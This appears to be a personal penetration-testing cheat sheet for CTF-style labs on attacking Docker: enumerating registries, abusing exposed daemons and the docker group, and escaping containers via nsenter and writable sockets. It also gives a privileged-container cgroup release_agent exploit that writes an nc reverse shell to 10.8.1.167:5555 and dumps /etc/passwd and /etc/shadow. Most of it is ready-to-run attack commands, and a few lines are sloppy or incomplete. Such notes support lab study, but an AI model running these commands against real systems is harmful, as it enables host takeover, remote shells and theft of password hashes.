##### Docker registries
A docker registry is a storage and distribution system for named Docker images. 
The registry is organized into Docker repositories, with information about the current images.
The default port is 5000.

To enumerate Docker registries, use [[docker-grabber]]
To query the Docker images:
```
curl http://IP:PORT/v2/_catalog                        // Get all active Docker images.
curl http://IP:PORT/v2/REPOSITORY/NAME/tags/list       // Get tags of an image.
curl http://IP:PORT/v2/REPOSITORY/NAME/manifests/TAG   // Get info of a tag (usually contains command history)
```

##### Reverse engineering
If you're able to query the data inside of the docker registry (see [[#Docker registries]]), `docker pull` the registry:
```c++
nano /etc/docker/daemon.json
add IP:PORT to the list
systemctl stop docker*
systemctl start docker
systemctl start docker.socket

docker info   // Check if the IP has been added to the insecure registries.
```
try dumping the docker images with [[Dive]]

##### Exposed docker daemon
If you find an exposed docker daemon (Nmap docker, with a lot of info), you can communicate with the image inside.
To confirm access, use `curl http://IP:PORT/version`
To execute code:
```
docker -H tcp://IP:PORT ps                        // List running images
docker -H tcp://IP:PORT exec CONTAINER_ID COMMAND // Execute a command in a container  
use rootplease (haven't figured out yet)
```

##### Exposed internal docker daemon
Assuming you've got a foothold on the target system, check for the "Docker" group using `groups`
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh         // Mount the host system to the internal image
// IMPORTANT NOTE: This won't work on THM servers, or other places without access to the internet.
// To bypass this, replace the "alpine" with the ID of the box, like this:
docker images                                               // Copy the ID of any of the available images.
docker run -v /:/mnt --rm -it ANY_IMAGE_ID chroot /mnt sh   // Mount the host system to the internal image
```

##### Shared namespaces
If you see a lot of processes when running `ps aux`  generally 20+, try this:
```
nsenter --target 1 --mount sh
```
`--target 1`  -- The targetted process (and the target namespace)
`--mount`  -- the mount namespace of the target process
`sh`  -- Execute `sh` in the namespace (kernel)

##### Capabilities
Requirement: a Docker image with `privileged` mode enabled.
The `priveleged` mode means that all capabilities have been granted to the Docker image, allowing it to bypass the Docker Engine and reach the system.
To check if the image is Priveleged, use
```
capsh --print                    // If this gives lots of output, privileged mode is likely enabled.
capsh --print | grep sys_admin   // If this returns output, it is exploitable.
```

Exploitation:
```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.1.167 5555 >/tmp/f" >> /cmd
echo "cat /etc/passwd > $host_path/output" >> /cmd
echo "cat /etc/shadow > $host_path/output"
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

##### Writable docker socket
To get root in the docker, upload a docker binary.
Secondly, run 
```
./docker run --entrypoint /bin/bash -it --rm HOST_IMAGE_NAME
```

##### Scanning the host
The host of the docker's IP is usually 172.17.0.1
To make sure, use:
```
/sbin/ip route|awk '/default/ { print $3 }'
```
if you scan it using `nmap`, you might find something


### miscellaneous
get full tty: `script /dev/null -c bash`